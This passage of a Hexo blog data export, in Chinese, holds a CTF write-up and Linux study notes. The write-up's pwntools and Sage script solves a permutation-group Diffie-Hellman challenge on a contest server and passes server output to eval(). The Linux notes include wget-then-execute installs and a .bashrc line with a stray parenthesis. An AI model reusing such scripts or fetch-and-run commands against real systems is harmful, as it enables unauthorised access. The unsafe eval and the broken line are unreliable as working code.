python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"keyword\">from</span> sage.<span class=\"built_in\">all</span> <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"keyword\">from</span> sympy <span class=\"keyword\">import</span> primerange, prevprime</span><br><span class=\"line\"></span><br><span class=\"line\">p = remote(<span class=\"string\">&quot;202.38.93 .111&quot;</span>, <span class=\"number\">10114</span>)</span><br><span class=\"line\"><span class=\"comment\"># context.log_level = &quot;debug&quot;</span></span><br><span class=\"line\">token = &lt;your_token&gt;</span><br><span class=\"line\">p.sendlineafter(<span class=\"string\">b&quot;token: &quot;</span>, token.encode())</span><br><span class=\"line\">p.sendlineafter(<span class=\"string\">b&quot;&gt; your choice: &quot;</span>, <span class=\"string\">b&quot;3&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">n2perm</span>(<span class=\"params\">l</span>):</span><br><span class=\"line\">    ll = []</span><br><span class=\"line\">    i = <span class=\"number\">1</span></span><br><span class=\"line\">    <span class=\"keyword\">for</span> x <span class=\"keyword\">in</span> l:</span><br><span class=\"line\">        ll.append(<span class=\"built_in\">tuple</span>(<span class=\"built_in\">range</span>(i, i+x)))</span><br><span class=\"line\">        i += x</span><br><span class=\"line\">    <span class=\"keyword\">return</span> ll</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">aupton</span>(<span class=\"params\">N</span>):  <span class=\"comment\"># compute terms a(0)..a(N)</span></span><br><span class=\"line\">    V = [<span class=\"number\">1</span> <span class=\"keyword\">for</span> _ <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(N+<span class=\"number\">1</span>)]</span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> primerange(<span class=\"number\">2</span>, N+<span class=\"number\">1</span>):</span><br><span class=\"line\">        <span class=\"keyword\">for</span> j <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(N, i-<span class=\"number\">1</span>, -<span class=\"number\">1</span>):</span><br><span class=\"line\">            hi = V[j]</span><br><span class=\"line\">            pp = i</span><br><span class=\"line\">            <span class=\"keyword\">while</span> pp &lt;= j:</span><br><span class=\"line\">                hi = <span class=\"built_in\">max</span>((pp <span class=\"keyword\">if</span> j == pp <span class=\"keyword\">else</span> V[j-pp]*pp), hi)</span><br><span class=\"line\">                pp *= i</span><br><span class=\"line\">            V[j] = hi</span><br><span class=\"line\">    <span class=\"keyword\">return</span> V</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">get_fac</span>(<span class=\"params\">n</span>):</span><br><span class=\"line\">    prod = data[n - <span class=\"number\">1</span>]</span><br><span class=\"line\">    f = factor(prod)</span><br><span class=\"line\">    f_ = <span class=\"built_in\">str</span>(f).split(<span class=\"string\">&#x27;*&#x27;</span>)</span><br><span class=\"line\">    fl = []</span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> f_:</span><br><span class=\"line\">        <span class=\"keyword\">if</span> <span class=\"string\">&#x27;^&#x27;</span> <span class=\"keyword\">in</span> i:</span><br><span class=\"line\">            fl.append(<span class=\"built_in\">eval</span>(i.replace(<span class=\"string\">&#x27;^&#x27;</span>, <span class=\"string\">&#x27;**&#x27;</span>)))</span><br><span class=\"line\">        <span class=\"keyword\">else</span>:</span><br><span class=\"line\">            fl.append(<span class=\"built_in\">int</span>(i))</span><br><span class=\"line\">    <span class=\"keyword\">return</span> fl</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">get_fac2</span>(<span class=\"params\">n, fl1_prod</span>):</span><br><span class=\"line\">    fl2 = []</span><br><span class=\"line\">    i = <span class=\"number\">2</span></span><br><span class=\"line\">    <span class=\"keyword\">while</span> <span class=\"built_in\">sum</span>(fl2) &lt; n:</span><br><span class=\"line\">        <span class=\"keyword\">if</span> gcd(i, fl1_prod) == <span class=\"number\">1</span>:</span><br><span class=\"line\">            fl2.append(i)</span><br><span class=\"line\">        i += <span class=\"number\">1</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> <span class=\"built_in\">sum</span>(fl2) &gt; n:</span><br><span class=\"line\">        fl2.pop()</span><br><span class=\"line\">        fl2.pop()</span><br><span class=\"line\">        fl2.append(prevprime(n - <span class=\"built_in\">sum</span>(fl2)))</span><br><span class=\"line\">    <span class=\"keyword\">return</span> fl2</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">get_n2l</span>(<span class=\"params\">n</span>):</span><br><span class=\"line\">    l1 = get_fac(n)</span><br><span class=\"line\">    l2 = get_fac2(n, prod(l1))</span><br><span class=\"line\">    <span class=\"keyword\">return</span> n2perm(l1), n2perm(l2)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">get_n</span>():</span><br><span class=\"line\">    p.recvuntil(<span class=\"string\">b&#x27;[+] DH public key: n = &#x27;</span>)</span><br><span class=\"line\">    n = <span class=\"built_in\">int</span>(p.recvline()[:-<span class=\"number\">1</span>].decode())</span><br><span class=\"line\">    <span class=\"keyword\">return</span> n</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">get_bound</span>():</span><br><span class=\"line\">    p.recvuntil(<span class=\"string\">b&#x27;[+] The upper bound for my private key is &#x27;</span>)</span><br><span class=\"line\">    bound = <span class=\"built_in\">int</span>(p.recvline()[:-<span class=\"number\">1</span>].decode())</span><br><span class=\"line\">    <span class=\"keyword\">return</span> bound</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">get_pub</span>(<span class=\"params\">g</span>):</span><br><span class=\"line\">    p.sendlineafter(<span class=\"string\">b&#x27;(a list): &#x27;</span>,g.encode())</span><br><span class=\"line\">    p.recvuntil(<span class=\"string\">b&#x27; : &#x27;</span>)</span><br><span class=\"line\">    y = <span class=\"built_in\">eval</span>(p.recvline()[:-<span class=\"number\">1</span>].decode())</span><br><span class=\"line\">    <span class=\"keyword\">return</span> y</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">15</span>):</span><br><span class=\"line\">    n = get_n()</span><br><span class=\"line\">    bound = get_bound()</span><br><span class=\"line\">    info(<span class=\"string\">f&quot;    n = <span class=\"subst\">&#123;n&#125;</span>&quot;</span>)</span><br><span class=\"line\">    info(<span class=\"string\">f&quot;bound = <span class=\"subst\">&#123;bound&#125;</span>&quot;</span>)</span><br><span class=\"line\">    S = SymmetricGroup(n)</span><br><span class=\"line\">    data = aupton(<span class=\"number\">2000</span>)</span><br><span class=\"line\">    g,g_ = get_n2l(n)</span><br><span class=\"line\">    g1, g2 = S(g), S(g_)</span><br><span class=\"line\">    opt = lcm(g1.order(), g2.order())</span><br><span class=\"line\">    info(<span class=\"string\">f&quot;  opt = <span class=\"subst\">&#123;opt&#125;</span>&quot;</span>)</span><br><span class=\"line\">    <span class=\"keyword\">if</span> opt &lt; bound:</span><br><span class=\"line\">        warning(<span class=\"string\">&quot;opt &lt; bound&quot;</span>)</span><br><span class=\"line\">    pub1 = get_pub(<span class=\"built_in\">str</span>(<span class=\"built_in\">list</span>(g1.<span class=\"built_in\">tuple</span>())))</span><br><span class=\"line\">    pub2 = get_pub(<span class=\"built_in\">str</span>(<span class=\"built_in\">list</span>(g2.<span class=\"built_in\">tuple</span>())))</span><br><span class=\"line\">    pub1, pub2 = S(pub1), S(pub2)</span><br><span class=\"line\">    m1, m2 = discrete_log(pub1,g1), discrete_log(pub2,g2)</span><br><span class=\"line\">    <span class=\"comment\"># success(f&quot;m1 = &#123;m1&#125;\\nm2 = &#123;m2&#125;&quot;)</span></span><br><span class=\"line\">    m = crt([m1,m2],[g1.order(),g2.order()])</span><br><span class=\"line\">    success(<span class=\"string\">f&quot;    m = <span class=\"subst\">&#123;m&#125;</span>&quot;</span>)</span><br><span class=\"line\">    p.sendlineafter(<span class=\"string\">b&#x27;&gt; your answer: &#x27;</span>, <span class=\"built_in\">str</span>(m).encode())</span><br><span class=\"line\">    res = p.recvline().decode()</span><br><span class=\"line\">    <span class=\"keyword\">assert</span> res == <span class=\"string\">&#x27;Good job\\n&#x27;</span>, res</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">print</span>(p.recvline().decode())</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"矩阵之困（未解出）\"><a href=\"#矩阵之困（未解出）\" class=\"headerlink\" title=\"矩阵之困（未解出）\"></a>矩阵之困（未解出）</h2><p>开赛做完签到后看的第一题，结果最后也成为本场比赛最难的 1 解题（表面看起来是 2 解，但其实两个号都是 mcfx），不得不说我眼光真好（）<br>查到三向量内积可表示成 $a^TBc$ ，其中 $B$ 的对角线为 $b$ ，但似乎没什么用。<br>用 z3 梭了几天出不来，放弃。</p>\n<h2 id=\"片上系统（未解出）\"><a href=\"#片上系统（未解出）\" class=\"headerlink\" title=\"片上系统（未解出）\"></a>片上系统（未解出）</h2><p>发现 pulseview 还挺有意思。</p>\n<h2 id=\"量子藏宝图\"><a href=\"#量子藏宝图\" class=\"headerlink\" title=\"量子藏宝图\"></a>量子藏宝图</h2><p>挺有意思的，一直只研究后量子密码学，却没看过量子密码，正好补充知识。</p>\n<h2 id=\"企鹅拼盘\"><a href=\"#企鹅拼盘\" class=\"headerlink\" title=\"企鹅拼盘\"></a>企鹅拼盘</h2><p>Level1 手试即可，结果为 <code>1000</code> 。</p>\n<h2 id=\"火眼金睛的小E\"><a href=\"#火眼金睛的小E\" class=\"headerlink\" title=\"火眼金睛的小E\"></a>火眼金睛的小E</h2><p>Level1 直接装个 bindiff 人工比对，但是正确率不太高，需要多试几次，有时甚至 bindiff 连函数都没检测出来。。。</p>"},{"title":"Linux 学习笔记","date":"2022-07-07T13:00:00.000Z","_content":"\n最近用到 Linux 挺多，整理一下。\n<!--more-->\n\n## 终端美化\n\n一个好看的终端确实是第一生产力\n\n```bash\n# 安装 oh-my-posh\nsudo wget https://github.com/JanDeDobbeleer/oh-my-posh/releases/latest/download/posh-linux-amd64 -O /usr/local/bin/oh-my-posh\nsudo chmod +x /usr/local/bin/oh-my-posh\n# 下载主题\nmkdir ~/.poshthemes\nwget https://github.com/JanDeDobbeleer/oh-my-posh/releases/latest/download/themes.zip -O ~/.poshthemes/themes.zip\nunzip ~/.poshthemes/themes.zip -d ~/.poshthemes\nchmod u+rw ~/.poshthemes/*.omp.*\nrm ~/.poshthemes/themes.zip\n```\n\n`oh-my-posh get shell` 看看 shell，一般是 bash 的情况下，就在 `~/.bashrc`（也可能是 `~/.profile` 或 `~/.bash_profile`）文件追加一行\n\n```bash\neval \"$(oh-my-posh init bash --config ~/.poshthemes/.kali.omp.json))\" # kali为主题名称，可以自己更换其他的\n```\n\n说起来这个 kali 主题还是 GZTime 学长提的 pr ，当时他还打成了 kail 来着（笑\n然后执行以下命令重载配置文件：\n\n```bash\nexec bash\n```\n\n> oh-my-posh 官方文档：<https://ohmyposh.dev/docs/>\n\n## 换源\n\nCentOS 默认已经调好阿里源了，就不用换了，以下是 apt 换中大源的方法：\n\n```bash\nsudo vim /etc/apt/sources.list\n```\n\n按 `i` 切换到编辑模式，然后全删了，写入 `deb https://mirrors.matrix.moe/kali kali-rolling main non-free contrib`，`Esc` 键退出编辑模式，`:wq` 保存退出。\n\n更新软件源列表：\n\n```bash\nsudo apt update\n```\n\n## ssh配置\n\n想起我闲置的阿里服务器，又折腾了好久。\n首先新建用户： `adduser <用户名>` 并设置好密码（网上说 CentOS 下的 adduser 和 useradd 是一样的，但我用的时候他也给我一整套配下来了，`home` 下也有文件夹。）\n\n```bash\nsu <用户名>\nssh-keygen -t rsa   #生成密钥对，一路回车就行\ncd ~/.ssh\ncat id_rsa.pub >> authorized_keys   #把密钥添加到authorized_keys文件中\nchmod 600 authorized_keys\nchmod 700 ~/.ssh    #权限700的时候，sshd才能读到\nservice sshd restart    #重启sshd服务\n```\n\n## 权限说明\n\n一般用三个数字表明文件的权限，第一个数字表示用户，第二个数字表示组，第三个数字表示公共。\n\n4 表示可读， 2 表示可写， 1 表示可执行，加一起就是全部权限。\n比如 755 表示用户可读，可写，可执行，组可读，可执行，公共可读，可执行。\n\n可能你会问 222 权限啥意思，难道还能只写不读？\n其实还真是这样，笔者试过可以 `cat >> file` 进行追加写入，但不能读取文件内容。\n\n遇到文件执行不了的情况，试试 `chmod +x [file]` ，就有执行权限了。\n\n## 编辑器（vim）\n\n虽然有 VSCode 的存在，但有时候由于 ssh 的用户权限不够等原因不可避免地要用到 vim （当然硬要避免也有在其他地方写好再 cp 过去等诡方法，但总是麻烦着点）\nvim 的三个模式：**命令**模式（ Command mode ），**输入**模式（ Insert mode ）和**底线命令**模式（ Last line mode ）\n一般就按 `i` 进入编辑模式， `Esc` 退出编辑模式并 `:wq` 保存退出。\n在查看模式下，可以 `h` 左移， `j` 下移， `k` 上移， `l` 右移，按 `/` 可以搜索。\n\n## 常用命令\n\n> 命令行 without 鼠标确实爽。\n\n### chown\n\n即 change owner ，用于改变文件的所有者。\n\n一般 `chown [user] [file]` ，如果是目录还要加上 `-R` 参数，意为改变目录下所有文件的所有者。\n\n### ln\n\n即 link ，用于创建符号链接，和 Windows 的快捷方式类似。\n\n一般 `ln -s [old] [new]` ，就是创建一个符号链接，把 old 文件的内容链接到 new 文件，如果后面不加 `[new]` 参数，那么就会默认创建到当前目录下。\n\n### ps\n\n即 process status ，用于查看进程状态。\n\n一般加 -aux 显示所有包含其他使用者的进程。\n不过这只是一个快照，如果想看动态的，就用 [top](#top) 命令。\n\n### top\n\n没啥缩写了，就是 top ，用于实时显示进程的状态。\n\n### grep\n\n```bash\ngrep \"pattern\" filename # 在文件中查找 pattern 字符串\ngrep -r \"pattern\" directory # 在目录中递归查找 pattern 字符串\n```\n\n### du\n\n```bash\ndu -h --max-depth=1 | sort -h   # 查看当前目录下各文件夹大小\n```\n\n## 参考\n\n<https://www.lxlinux.net/1431.html>\n菜鸟教程\n<https://blog.csdn.net/KevinChen2019/article/details/119697489>\n<https://blog.csdn.net/lucky__peng/article/details/124268817>\n<https://blog.csdn.net/liuxiao723846/article/details/125042549>\n","source":"_posts/Linux 学习笔记.md","raw":"---\ntitle: Linux 学习笔记\ndate: 2022-07-07 21:00:00\ntags: [Linux]\ncategories: 学习\n---\n\n最近用到 Linux 挺多，整理一下。\n<!--more-->\n\n## 终端美化\n\n一个好看的终端确实是第一生产力\n\n```bash\n# 安装 oh-my-posh\nsudo wget https://github.com/JanDeDobbeleer/oh-my-posh/releases/latest/download/posh-linux-amd64 -O /usr/local/bin/oh-my-posh\nsudo chmod +x /usr/local/bin/oh-my-posh\n# 下载主题\nmkdir ~/.poshthemes\nwget https://github.com/JanDeDobbeleer/oh-my-posh/releases/latest/download/themes.zip -O ~/.poshthemes/themes.zip\nunzip ~/.poshthemes/themes.zip -d ~/.poshthemes\nchmod u+rw ~/.poshthemes/*.omp.*\nrm ~/.poshthemes/themes.zip\n```\n\n`oh-my-posh get shell` 看看 shell，一般是 bash 的情况下，就在 `~/.bashrc`（也可能是 `~/.profile` 或 `~/.bash_profile`）文件追加一行\n\n```bash\neval \"$(oh-my-posh init bash --config ~/.poshthemes/.kali.omp.json))\" # kali为主题名称，可以自己更换其他的\n```\n\n说起来这个 kali 主题还是 GZTime 学长提的 pr ，当时他还打成了 kail 来着（笑\n然后执行以下命令重载配置文件：\n\n```bash\nexec bash\n```\n\n> oh-my-posh 官方文档：<https://ohmyposh.dev/docs/>\n\n## 换源\n\nCentOS 默认已经调好阿里源了，就不用换了，以下是 apt 换中大源的方法：\n\n```bash\nsudo vim /etc/apt/sources.list\n```\n\n按 `i` 切换到编辑模式，然后全删了，写入 `deb https://mirrors.matrix.moe/kali kali-rolling main non-free contrib`，`Esc` 键退出编辑模式，`:wq` 保存退出。\n\n更新软件源列表：\n\n```bash\nsudo apt update\n```\n\n## ssh配置\n\n想起我闲置的阿里服务器，又折腾了好久。\n首先新建用户： `adduser <用户名>` 并设置好密码（网上说 CentOS 下的 adduser 和 useradd 是一样的，但我用的时候他也给我一整套配下来了，`home` 下也有文件夹。）\n\n```bash\nsu <用户名>\nssh-keygen -t rsa   #生成密钥对，一路回车就行\ncd ~/.ssh\ncat id_rsa.pub >> authorized_keys   #把密钥添加到authorized_keys文件中\nchmod 600 authorized_keys\nchmod 700 ~/.ssh    #权限700的时候，sshd才能读到\nservice sshd restart    #重启sshd服务\n```\n\n## 权限说明\n\n一般用三个数字表明文件的权限，第一个数字表示用户，第二个数字表示组，第三个数字表示公共。\n\n4 表示可读， 2 表示可写， 1 表示可执行，加一起就是全部权限。\n比如 755 表示用户可读，可写，可执行，组可读，可执行，公共可读，可执行。\n\n可能你会问 222 权限啥意思，难道还能只写不读？\n其实还真是这样，笔者试过可以 `cat >> file` 进行追加写入，但不能读取文件内容。\n\n遇到文件执行不了的情况，试试 `chmod +x [file]` ，就有执行权限了。\n\n## 编辑器（vim）\n\n虽然有 VSCode 的存在，但有时候由于 ssh 的用户权限不够等原因不可避免地要用到 vim （当然硬要避免也有在其他地方写好再 cp 过去等诡方法，但总是麻烦着点）\nvim 的三个模式：**命令**模式（ Command mode ），**输入**模式（ Insert mode ）和**底线命令**模式（ Last line mode ）\n一般就按 `i` 进入编辑模式， `Esc` 退出编辑模式并 `:wq` 保存退出。\n在查看模式下，可以 `h` 左移， `j` 下移， `k` 上移， `l` 右移，按 `/` 可以搜索。\n\n## 常用命令\n\n> 命令行 without 鼠标确实爽。\n\n### chown\n\n即 change owner ，用于改变文件的所有者。\n\n一般 `chown [user] [file]` ，如果是目录还要加上 `-R` 参数，意为改变目录下所有文件的所有者。\n\n### ln\n\n即 link ，用于创建符号链接，和 Windows 的快捷方式类似。\n\n一般 `ln -s [old] [new]` ，就是创建一个符号链接，把 old 文件的内容链接到 new 文件，如果后面不加 `[new]` 参数，那么就会默认创建到当前目录下。\n\n### ps\n\n即 process status ，用于查看进程状态。\n\n一般加 -aux 显示所有包含其他使用者的进程。\n不过这只是一个快照，如果想看动态的，就用 [top](#top) 命令。\n\n### top\n\n没啥缩写了，就是 top ，用于实时显示进程的状态。\n\n### grep\n\n```bash\ngrep \"pattern\" filename # 在文件中查找 pattern 字符串\ngrep -r \"pattern\" directory # 在目录中递归查找 pattern 字符串\n```\n\n### du\n\n```bash\ndu -h --max-depth=1 | sort -h   # 查看当前目录下各文件夹大小\n```\n\n## 参考\n\n<https://www.lxlinux.net/1431.html>\n菜鸟教程\n<https://blog.csdn.net/KevinChen2019/article/details/119697489>\n<https://blog.csdn.net/lucky__peng/article/details/124268817>\n<https://blog.csdn.net/liuxiao723846/article/details/125042549>\n","slug":"Linux 学习笔记","published":1,"updated":"2024-06-03T06:12:41.268Z","_id":"cla7okcsv0000fs6g5kxc6z0y","comments":1,"layout":"post","photos":[],"content":"<p>最近用到 Linux 挺多，整理一下。</p>\n<span id=\"more\"></span>\n\n<h2 id=\"终端美化\"><a href=\"#终端美化\" class=\"headerlink\" title=\"终端美化\"></a>终端美化</h2><p>一个好看的终端确实是第一生产力</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 安装 oh-my-posh</span></span><br><span class=\"line\">sudo wget https://github.com/JanDeDobbeleer/oh-my-posh/releases/latest/download/posh-linux-amd64 -O /usr/local/bin/oh-my-posh</span><br><span class=\"line\">sudo <span class=\"built_in\">chmod</span> +x /usr/local/bin/oh-my-posh</span><br><span class=\"line\"><span class=\"comment\"># 下载主题</span></span><br><span class=\"line\"><span class=\"built_in\">mkdir</span> ~/.poshthemes</span><br><span class=\"line\">wget https://github.com/JanDeDobbeleer/oh-my-posh/releases/latest/download/themes.zip -O ~/.poshthemes/themes.zip</span><br><span class=\"line\">unzip ~/.poshthemes/themes.zip -d ~/.poshthemes</span><br><span class=\"line\"><span class=\"built_in\">chmod</span> u+rw ~/.poshthemes/*.omp.*</span><br><span class=\"line\"><span class=\"built_in\">rm</span> ~/.poshthemes/themes.zip</span><br></pre></td></tr></table></figure>\n\n<p><code>oh-my-posh get shell</code> 看看 shell，一般是 bash 的情况下，就在 <code>~/.bashrc</code>（也可能是 <code>~/.profile</code> 或 <code>~/.bash_profile</code>）文件追加一行</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">eval</span> <span class=\"string\">&quot;<span class=\"subst\">$(oh-my-posh init bash --config ~/.poshthemes/.kali.omp.json)</span>)&quot;</span> <span class=\"comment\"># kali为主题名称，可以自己更换其他的</span></span><br></pre></td></tr></table></figure>\n\n<p>说起来这个 kali 主题还是 GZTime 学长提的 pr ，当时他还打成了 kail 来着（笑<br>然后执行以下命令重载配置文件：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">exec</span> bash</span><br></pre></td></tr></table></figure>\n\n<blockquote>\n<p>oh-my-posh 官方文档：<a href=\"https://ohmyposh.dev/docs/\">https://ohmyposh.dev/docs/</a></p>\n</blockquote>\n<h2 id=\"换源\"><a href=\"#换源\" class=\"headerlink\" title=\"换源\"></a>换源</h2><p>CentOS 默认已经调好阿里源了，就不用换了，以下是 apt 换中大源的方法：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sudo vim /etc/apt/sources.list</span><br></pre></td></tr></table></figure>\n\n<p>按 <code>i</code> 切换到编辑模式，然后全删了，写入 <code>deb https://mirrors.matrix.moe/kali kali-rolling main non-free contrib</code>，<code>Esc</code> 键退出编辑模式，<code>:wq</code> 保存退出。</p>\n<p>更新软件源列表：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sudo apt update</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"ssh配置\"><a href=\"#ssh配置\" class=\"headerlink\" title=\"ssh配置\"></a>ssh配置</h2><p>想起我闲置的阿里服务器，又折腾了好久。<br>首先新建用户： <code>adduser &lt;用户名&gt;</code> 并设置好密码（网上说 CentOS 下的 adduser 和 useradd 是一样的，但我用的时候他也给我一整套配下来了，<code>home</code> 下也有文件夹。）</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">su &lt;用户名&gt;</span><br><span class=\"line\">ssh-keygen -t rsa   <span class=\"comment\">#生成密钥对，一路回车就行</span></span><br><span class=\"line\"><span class=\"built_in\">cd</span> ~/.ssh</span><br><span class=\"line\"><span class=\"built_in\">cat</span> id_rsa.pub &gt;&gt; authorized_keys   <span class=\"comment\">#把密钥添加到authorized_keys文件中</span></span><br><span class=\"line\"><span class=\"built_in\">chmod</span> 600 authorized_keys</span><br><span class=\"line\"><span class=\"built_in\">chmod</span> 700 ~/.ssh    <span class=\"comment\">#权限700的时候，sshd才能读到</span></span><br><span class=\"line\">service sshd restart    <span class=\"comment\">#重启sshd服务</span></span><br></pre></td></tr></table></figure>\n\n<h2 id=\"权限说明\"><a href=\"#权限说明\" class=\"headerlink\" title=\"权限说明\"></a>权限说明</h2><p>一般用三个数字表明文件的权限，第一个数字表示用户，第二个数字表示组，第三个数字表示公共。</p>\n<p>4 表示可读， 2 表示可写， 1 表示可执行，加一起就是全部权限。<br>比如 755 表示用户可读，可写，可执行，组可读，可执行，公共可读，可执行。</p>\n<p>可能你会问 222 权限啥意思，难道还能只写不读？<br>其实还真是这样，笔者试过可以 <code>cat &gt;&gt; file</code> 进行追加写入，但不能读取文件内容。</p>\n<p>遇到文件执行不了的情况，试试 <code>chmod +x [file]</code> ，就有执行权限了。</p>\n<h2 id=\"编辑器（vim）\"><a href=\"#编辑器（vim）\" class=\"headerlink\" title=\"编辑器（vim）\"></a>编辑器（vim）</h2><p>虽然有 VSCode 的存在，但有时候由于 ssh 的用户权限不够等原因不可避免地要用到 vim （当然硬要避免也有在其他地方写好再 cp 过去等诡方法，但总是麻烦着点）<br>vim 的三个模式：<strong>命令</strong>模式（ Command mode ），<strong>输入</strong>模式（ Insert mode ）和<strong>底线命令</strong>模式（ Last line mode ）<br>一般就按 <code>i</code> 进入编辑模式， <code>Esc</code> 退出编辑模式并 <code>:wq</code> 保存退出。<br>在查看模式下，可以 <code>h</code> 左移， <code>j</code> 下移， <code>k</code> 上移， <code>l</code> 右移，按 <code>/</code> 可以搜索。</p>\n<h2 id=\"常用命令\"><a href=\"#常用命令\" class=\"headerlink\" title=\"常用命令\"></a>常用命令</h2><blockquote>\n<p>命令行 without 鼠标确实爽。</p>\n</blockquote>\n<h3 id=\"chown\"><a href=\"#chown\" class=\"headerlink\" title=\"chown\"></a>chown</h3><p>即 change owner ，用于改变文件的所有者。</p>\n<p>一般 <code>chown [user] [file]</code> ，如果是目录还要加上 <code>-R</code> 参数，意为改变目录下所有文件的所有者。</p>\n<h3 id=\"ln\"><a href=\"#ln\" class=\"headerlink\" title=\"ln\"></a>ln</h3><p>即 link ，用于创建符号链接，和 Windows 的快捷方式类似。</p>\n<p>一般 <code>ln -s [old] [new]</code> ，就是创建一个符号链接，把 old 文件的内容链接到 new 文件，如果后面不加 <code>[new]</code> 参数，那么就会默认创建到当前目录下。</p>\n<h3 id=\"ps\"><a href=\"#ps\" class=\"headerlink\" title=\"ps\"></a>ps</h3><p>即 process status ，用于查看进程状态。</p>\n<p>一般加 -aux 显示所有包含其他使用者的进程。<br>不过这只是一个快照，如果想看动态的，就用 <a href=\"#top\">top</a> 命令。</p>\n<h3 id=\"top\"><a href=\"#top\" class=\"headerlink\" title=\"top\"></a>top</h3><p>没啥缩写了，就是 top ，用于实时显示进程的状态。</p>\n<h3 id=\"grep\"><a href=\"#grep\" class=\"headerlink\" title=\"grep\"></a>grep</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span 